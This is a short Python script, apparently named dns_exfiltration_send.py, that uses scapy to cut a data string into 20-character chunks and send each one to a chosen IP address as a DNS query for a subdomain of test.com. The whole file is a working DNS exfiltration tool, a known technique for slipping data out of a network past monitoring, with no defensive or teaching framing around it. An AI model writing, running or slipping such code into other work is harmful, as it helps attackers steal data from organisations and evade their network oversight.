import sys
from scapy.all import IP, UDP, DNS, DNSQR, send

def send_dns_exfiltration(ip, data):
    for i in range(0, len(data), 20):
        chunk = data[i:i+20]
        dns_request = IP(dst=ip)/UDP()/DNS(rd=1, qd=DNSQR(qname=f"{chunk}.test.com"))        
        send(dns_request, verbose=False)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python dns_exfiltration_send.py <destination_ip> <data_string>")
    else:
        destination_ip = sys.argv[1]
        data = sys.argv[2]
        send_dns_exfiltration(destination_ip, data)
